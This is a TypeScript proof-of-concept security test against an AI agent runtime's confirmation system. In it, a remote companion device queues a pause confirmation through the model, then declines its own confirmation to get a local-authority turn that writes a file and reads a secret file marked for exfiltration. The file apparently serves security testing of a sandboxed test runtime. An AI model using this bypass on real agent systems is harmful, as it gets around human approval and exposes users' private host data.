/**
 * Escalation of attack1: can the remote device create the pending confirmation itself,
 * so the whole chain needs nothing from the person at the machine?
 * runtime_pause is permission "confirm", carries no capability and no client scope,
 * so a trusted remote device can queue it.
 */
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { testRuntime, enrolCompanion } from "../../../../src/vesper/test-helpers.ts";
import { createClientGateway } from "../../../../src/vesper/client/gateway.ts";
import { planProvider, type Step } from "./plan-provider.ts";

const root = await mkdtemp(join(tmpdir(), "vesper-root-"));
await writeFile(join(root, "secret.txt"), "PRIVATE-HOST-ONLY-DATA", "utf8");

const plan: Step[] = [];
const runtime = await testRuntime({ providers: [planProvider(plan)], config: { approvedRoots: [root] } });
const gw = createClientGateway(runtime);
const peer = await enrolCompanion(runtime, { name: "phone", trust: "trusted" });
const session = await gw.issueSession({
  deviceId: peer.deviceId,
  scopes: ["status", "conversation", "operator.confirm"],
});
if ("ok" in session) throw new Error(JSON.stringify(session));

console.log("local confirmations before:", runtime.confirmations.size);

// Step 1 (remote): converse, model asks for runtime_pause -> queues a confirmation.
plan.length = 0;
plan.push({ name: "runtime_pause", args: {} }, null);
const t1 = await gw.converse(session.token, "pause background work");
console.log("step1 reply:", (t1 as any).reply);
const ids = [...runtime.confirmations.keys()];
console.log("confirmations after remote turn:", ids.length,
  JSON.stringify([...runtime.confirmations.values()].map((c) => ({ t: c.toolName, by: c.requestedBy }))));

// Step 2 (remote): decline its OWN confirmation -> local-authority turn.
plan.length = 0;
plan.push({ name: "fs_write", args: { path: join(root, "pwned.txt"), content: "written by a remote device" } }, null);
const t2 = await gw.confirm(session.token, ids[0], false);
for (const c of (t2 as any).toolCalls ?? []) {
  console.log(`  tool=${c.toolName} allowed=${c.decision.allowed} ok=${c.result?.ok} :: ${c.result?.summary ?? c.decision.reason}`);
}
// fs_write is itself "confirm" level; check what happened, then try a read too.
plan.length = 0;
plan.push({ name: "fs_read", args: { path: join(root, "secret.txt") } }, null);
const ids2 = [...runtime.confirmations.keys()];
const t3 = ids2.length ? await gw.confirm(session.token, ids2[0], false) : null;
if (t3) for (const c of (t3 as any).toolCalls ?? []) {
  console.log(`  tool=${c.toolName} allowed=${c.decision.allowed} ok=${c.result?.ok} :: ${c.result?.summary ?? c.decision.reason}`);
  if (c.result?.ok) console.log("  !!! EXFIL:", JSON.stringify((c.result.data as any)?.text));
}
await runtime.stop();
